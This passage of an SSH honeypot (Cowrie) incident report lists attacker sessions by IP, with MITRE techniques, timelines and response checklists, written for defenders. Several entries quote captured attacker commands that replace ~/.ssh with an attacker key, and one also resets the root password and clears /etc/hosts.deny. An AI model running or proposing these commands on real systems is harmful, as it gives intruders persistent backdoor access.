| `2026-06-12 19:00:25` | `cowrie.session.connect` |
| `2026-06-12 19:00:25` | `cowrie.client.version` |
| `2026-06-12 19:00:25` | `cowrie.client.kex` |
| `2026-06-12 19:00:26` | `cowrie.login.success` |
| `2026-06-12 19:00:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.196.253[.]20` to AbuseIPDB if not already reported
- [ ] Block `196.196.253[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3aacf6881cd

| Field | Detail |
|---|---|
| **Source IP** | `114.219.157[.]97` |
| **First Seen** | 2026-06-12 19:00 |
| **Last Seen** | 2026-06-12 19:00 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:YuasqHKoHSTj"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 19:00:33` | `cowrie.session.connect` |
| `2026-06-12 19:00:34` | `cowrie.client.version` |
| `2026-06-12 19:00:34` | `cowrie.client.kex` |
| `2026-06-12 19:00:35` | `cowrie.login.success` |
| `2026-06-12 19:00:35` | `cowrie.session.params` |
| `2026-06-12 19:00:35` | `cowrie.command.input` |
| `2026-06-12 19:00:35` | `cowrie.command.failed` |
| `2026-06-12 19:00:36` | `cowrie.log.closed` |
| `2026-06-12 19:00:36` | `cowrie.session.params` |
| `2026-06-12 19:00:36` | `cowrie.command.input` |
| `2026-06-12 19:00:36` | `cowrie.session.file_download` |
| `2026-06-12 19:00:36` | `cowrie.log.closed` |
| `2026-06-12 19:00:48` | `cowrie.session.params` |
| `2026-06-12 19:00:48` | `cowrie.command.input` |
| `2026-06-12 19:00:48` | `cowrie.log.closed` |
| `2026-06-12 19:00:49` | `cowrie.session.params` |
| `2026-06-12 19:00:49` | `cowrie.command.input` |
| `2026-06-12 19:00:49` | `cowrie.log.closed` |
| `2026-06-12 19:00:49` | `cowrie.session.params` |
| `2026-06-12 19:00:49` | `cowrie.command.input` |
| `2026-06-12 19:00:49` | `cowrie.session.file_download` |
| `2026-06-12 19:00:49` | `cowrie.log.closed` |
| `2026-06-12 19:00:50` | `cowrie.session.params` |
| `2026-06-12 19:00:50` | `cowrie.command.input` |
| `2026-06-12 19:00:50` | `cowrie.log.closed` |
| `2026-06-12 19:00:50` | `cowrie.session.params` |
| `2026-06-12 19:00:50` | `cowrie.command.input` |
| `2026-06-12 19:00:50` | `cowrie.log.closed` |
| `2026-06-12 19:00:51` | `cowrie.session.params` |
| `2026-06-12 19:00:51` | `cowrie.command.input` |
| `2026-06-12 19:00:51` | `cowrie.command.input` |
| `2026-06-12 19:00:51` | `cowrie.log.closed` |
| `2026-06-12 19:00:51` | `cowrie.session.params` |
| `2026-06-12 19:00:51` | `cowrie.command.input` |
| `2026-06-12 19:00:51` | `cowrie.log.closed` |
| `2026-06-12 19:00:52` | `cowrie.session.params` |
| `2026-06-12 19:00:52` | `cowrie.command.input` |
| `2026-06-12 19:00:52` | `cowrie.log.closed` |
| `2026-06-12 19:00:52` | `cowrie.session.params` |
| `2026-06-12 19:00:52` | `cowrie.command.input` |
| `2026-06-12 19:00:52` | `cowrie.log.closed` |
| `2026-06-12 19:00:53` | `cowrie.session.params` |
| `2026-06-12 19:00:53` | `cowrie.command.input` |
| `2026-06-12 19:00:53` | `cowrie.log.closed` |
| `2026-06-12 19:00:53` | `cowrie.session.params` |
| `2026-06-12 19:00:53` | `cowrie.command.input` |
| `2026-06-12 19:00:53` | `cowrie.log.closed` |
| `2026-06-12 19:00:54` | `cowrie.session.params` |
| `2026-06-12 19:00:54` | `cowrie.command.input` |
| `2026-06-12 19:00:54` | `cowrie.log.closed` |
| `2026-06-12 19:00:54` | `cowrie.session.params` |
| `2026-06-12 19:00:54` | `cowrie.command.input` |
| `2026-06-12 19:00:54` | `cowrie.log.closed` |
| `2026-06-12 19:00:55` | `cowrie.session.params` |
| `2026-06-12 19:00:55` | `cowrie.command.input` |
| `2026-06-12 19:00:55` | `cowrie.log.closed` |
| `2026-06-12 19:00:55` | `cowrie.session.params` |
| `2026-06-12 19:00:55` | `cowrie.command.input` |
| `2026-06-12 19:00:55` | `cowrie.log.closed` |
| `2026-06-12 19:00:56` | `cowrie.session.params` |
| `2026-06-12 19:00:56` | `cowrie.command.input` |
| `2026-06-12 19:00:56` | `cowrie.log.closed` |
| `2026-06-12 19:00:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.219.157[.]97` to AbuseIPDB if not already reported
- [ ] Block `114.219.157[.]97` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-054871dafa9b

| Field | Detail |
|---|---|
| **Source IP** | `103.74.5[.]44` |
| **First Seen** | 2026-06-12 19:00 |
| **Last Seen** | 2026-06-12 19:00 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 19:00:43` | `cowrie.session.connect` |
| `2026-06-12 19:00:43` | `cowrie.client.version` |
| `2026-06-12 19:00:43` | `cowrie.client.kex` |
| `2026-06-12 19:00:44` | `cowrie.login.success` |
| `2026-06-12 19:00:45` | `cowrie.session.params` |
| `2026-06-12 19:00:45` | `cowrie.command.input` |
| `2026-06-12 19:00:45` | `cowrie.command.failed` |
| `2026-06-12 19:00:45` | `cowrie.log.closed` |
| `2026-06-12 19:00:45` | `cowrie.session.params` |
| `2026-06-12 19:00:45` | `cowrie.command.input` |
| `2026-06-12 19:00:45` | `cowrie.session.file_download` |
| `2026-06-12 19:00:45` | `cowrie.log.closed` |
| `2026-06-12 19:00:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.74.5[.]44` to AbuseIPDB if not already reported
- [ ] Block `103.74.5[.]44` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cfce82f517b1

| Field | Detail |
|---|---|
| **Source IP** | `103.74.5[.]44` |
| **First Seen** | 2026-06-12 19:00 |
| **Last Seen** | 2026-06-12 19:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 19:00:52` | `cowrie.session.connect` |
| `2026-06-12 19:00:52` | `cowrie.client.version` |
| `2026-06-12 19:00:52` | `cowrie.client.kex` |
| `2026-06-12 19:00:54` | `cowrie.login.success` |
| `2026-06-12 19:00:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.74.5[.]44` to AbuseIPDB if not already reported
- [ ] Block `103.74.5[.]44` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-179e42ea35e1

| Field | Detail |
|---|---|
| **Source IP** | `196.196.253[.]20` |
| **First Seen** | 2026-06-12 19:02 |
| **Last Seen** | 2026-06-12 19:02 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 19:02:33` | `cowrie.session.connect` |
| `2026-06-12 19:02:33` | `cowrie.client.version` |
| `2026-06-12 19:02:33` | `cowrie.client.kex` |
| `2026-06-12 19:02:34` | `cowrie.login.success` |
| `2026-06-12 19:02:34` | `cowrie.session.params` |
| `2026-06-12 19:02:34` | `cowrie.command.input` |
| `2026-06-12 19:02:34` | `cowrie.command.failed` |
| `2026-06-12 19:02:35` | `cowrie.log.closed` |
| `2026-06-12 19:02:35` | `cowrie.session.params` |
| `2026-06-12 19:02:35` | `cowrie.command.input` |
| `2026-06-12 19:02:35` | `cowrie.session.file_download` |
| `2026-06-12 19:02:35` | `cowrie.log.closed` |
| `2026-06-12 19:02:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.196.253[.]20` to AbuseIPDB if not already reported
- [ ] Block `196.196.253[.]20` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c040d2e36b9

| Field | Detail |
|---|---|
| **Source IP** | `196.196.253[.]20` |
| **First Seen** | 2026-06-12 19:02 |
| **Last Seen** | 2026-06-12 19:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 19:02:40` | `cowrie.session.connect` |
| `2026-06-12 19:02:40` | `cowrie.client.version` |
| `2026-06-12 19:02:40` | `cowrie.client.kex` |
| `2026-06-12 19:02:41` | `cowrie.login.success` |
| `2026-06-12 19:02:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.196.253[.]20` to AbuseIPDB if not already reported
- [ ] Block `196.196.253[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7fb11f9c2e2f

| Field | Detail |
|---|---|
| **Source IP** | `196.196.253[.]20` |
| **First Seen** | 2026-06-12 19:06 |
| **Last Seen** | 2026-06-12 19:06 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 19:06:50` | `cowrie.session.connect` |
| `2026-06-12 19:06:50` | `cowrie.client.version` |
| `2026-06-12 19:06:50` | `cowrie.client.kex` |
| `2026-06-12 19:06:51` | `cowrie.login.success` |
| `2026-06-12 19:06:51` | `cowrie.session.params` |
| `2026-06-12 19:06:51` | `cowrie.command.input` |
| `2026-06-12 19:06:51` | `cowrie.command.failed` |
| `2026-06-12 19:06:51` | `cowrie.log.closed` |
| `2026-06-12 19:06:52` | `cowrie.session.params` |
| `2026-06-12 19:06:52` | `cowrie.command.input` |
| `2026-06-12 19:06:53` | `cowrie.session.file_download` |
| `2026-06-12 19:06:53` | `cowrie.log.closed` |
| `2026-06-12 19:06:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.196.253[.]20` to AbuseIPDB if not already reported
- [ ] Block `196.196.253[.]20` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-726141985e1e

| Field | Detail |
|---|---|
| **Source IP** | `196.196.253[.]20` |
| **First Seen** | 2026-06-12 19:06 |
| **Last Seen** | 2026-06-12 19:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 19:06:56` | `cowrie.session.connect` |
| `2026-06-12 19:06:56` | `cowrie.client.version` |
| `2026-06-12 19:06:56` | `cowrie.client.kex` |
| `2026-06-12 19:06:57` | `cowrie.login.success` |
| `2026-06-12 19:06:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.196.253[.]20` to AbuseIPDB if not already reported
- [ ] Block `196.196.253[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-072850ca4abb

| Field | Detail |
|---|---|
| **Source IP** | `103.60.242[.]169` |
| **First Seen** | 2026-06-12 19:07 |
| **Last Seen** | 2026-06-12 19:07 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 19:07:09` | `cowrie.session.connect` |
| `2026-06-12 19:07:09` | `cowrie.client.version` |
| `2026-06-12 19:07:09` | `cowrie.client.kex` |
| `2026-06-12 19:07:10` | `cowrie.login.success` |
| `2026-06-12 19:07:10` | `cowrie.session.params` |
| `2026-06-12 19:07:10` | `cowrie.command.input` |
| `2026-06-12 19:07:10` | `cowrie.command.failed` |
| `2026-06-12 19:07:10` | `cowrie.log.closed` |
| `2026-06-12 19:07:10` | `cowrie.session.params` |
| `2026-06-12 19:07:10` | `cowrie.command.input` |
| `2026-06-12 19:07:10` | `cowrie.session.file_download` |
| `2026-06-12 19:07:10` | `cowrie.log.closed` |
| `2026-06-12 19:07:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.60.242[.]169` to AbuseIPDB if not already reported
- [ ] Block `103.60.242[.]169` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1302ac8b98d

| Field | Detail |
|---|---|
| **Source IP** | `103.60.242[.]169` |
| **First Seen** | 2026-06-12 19:07 |
| **Last Seen** | 2026-06-12 19:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 19:07:12` | `cowrie.session.connect` |
| `2026-06-12 19:07:12` | `cowrie.client.version` |
| `2026-06-12 19:07:12` | `cowrie.client.kex` |
| `2026-06-12 19:07:13` | `cowrie.login.success` |
| `2026-06-12 19:07:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.60.242[.]169` to AbuseIPDB if not already reported
- [ ] Block `103.60.242[.]169` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-975b63760494

| Field | Detail |
|---|---|
| **Source IP** | `103.74.5[.]44` |
| **First Seen** | 2026-06-12 19:07 |
| **Last Seen** | 2026-06-12 19:07 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 19:07:48` | `cowrie.session.connect` |
| `2026-06-12 19:07:48` | `cowrie.client.version` |
| `2026-06-12 19:07:48` | `cowrie.client.kex` |
| `2026-06-12 19:07:49` | `cowrie.login.success` |
| `2026-06-12 19:07:50` | `cowrie.session.params` |
| `2026-06-12 19:07:50` | `cowrie.command.input` |
| `2026-06-12 19:07:50` | `cowrie.command.failed` |
| `2026-06-12 19:07:50` | `cowrie.log.closed` |
| `2026-06-12 19:07:50` | `cowrie.session.params` |
| `2026-06-12 19:07:50` | `cowrie.command.input` |
| `2026-06-12 19:07:51` | `cowrie.session.file_download` |
| `2026-06-12 19:07:51` | `cowrie.log.closed` |
| `2026-06-12 19:07:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.74.5[.]44` to AbuseIPDB if not already reported
- [ ] Block `103.74.5[.]44` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d92025d57f5

| Field | Detail |
|---|---|
| **Source IP** | `103.74.5[.]44` |
| **First Seen** | 2026-06-12 19:07 |
| **Last Seen** | 2026-06-12 19:07 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 19:07:53` | `cowrie.session.connect` |
| `2026-06-12 19:07:53` | `cowrie.client.version` |
| `2026-06-12 19:07:54` | `cowrie.client.kex` |
| `2026-06-12 19:07:56` | `cowrie.login.success` |
| `2026-06-12 19:07:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.74.5[.]44` to AbuseIPDB if not already reported
- [ ] Block `103.74.5[.]44` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec410033c1dc

| Field | Detail |
|---|---|
| **Source IP** | `196.196.253[.]20` |
| **First Seen** | 2026-06-12 19:08 |
| **Last Seen** | 2026-06-12 19:09 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 19:08:55` | `cowrie.session.connect` |
| `2026-06-12 19:08:55` | `cowrie.client.version` |
| `2026-06-12 19:08:56` | `cowrie.client.kex` |
| `2026-06-12 19:08:56` | `cowrie.login.success` |
| `2026-06-12 19:08:57` | `cowrie.session.params` |
| `2026-06-12 19:08:57` | `cowrie.command.input` |
| `2026-06-12 19:08:57` | `cowrie.command.failed` |
| `2026-06-12 19:08:58` | `cowrie.log.closed` |
| `2026-06-12 19:08:59` | `cowrie.session.params` |
| `2026-06-12 19:08:59` | `cowrie.command.input` |
| `2026-06-12 19:08:59` | `cowrie.session.file_download` |
| `2026-06-12 19:08:59` | `cowrie.log.closed` |
| `2026-06-12 19:09:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.196.253[.]20` to AbuseIPDB if not already reported
- [ ] Block `196.196.253[.]20` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-684ab48de756

| Field | Detail |
|---|---|
| **Source IP** | `196.196.253[.]20` |
| **First Seen** | 2026-06-12 19:09 |
| **Last Seen** | 2026-06-12 19:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 19:09:02` | `cowrie.session.connect` |
| `2026-06-12 19:09:02` | `cowrie.client.version` |
| `2026-06-12 19:09:02` | `cowrie.client.kex` |
| `2026-06-12 19:09:03` | `cowrie.login.success` |
| `2026-06-12 19:09:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.196.253[.]20` to AbuseIPDB if not already reported
- [ ] Block `196.196.253[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c008754712d

| Field | Detail |
|---|---|
| **Source IP** | `103.74.5[.]44` |
| **First Seen** | 2026-06-12 19:10 |
| **Last Seen** | 2026-06-12 19:10 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 19:10:08` | `cowrie.session.connect` |
| `2026-06-12 19:10:08` | `cowrie.client.version` |
| `2026-06-12 19:10:08` | `cowrie.client.kex` |
| `2026-06-12 19:10:09` | `cowrie.login.success` |
| `2026-06-12 19:10:10` | `cowrie.session.params` |
| `2026-06-12 19:10:10` | `cowrie.command.input` |
| `2026-06-12 19:10:10` | `cowrie.command.failed` |
| `2026-06-12 19:10:10` | `cowrie.log.closed` |
| `2026-06-12 19:10:10` | `cowrie.session.params` |
| `2026-06-12 19:10:10` | `cowrie.command.input` |
| `2026-06-12 19:10:10` | `cowrie.session.file_download` |
| `2026-06-12 19:10:10` | `cowrie.log.closed` |
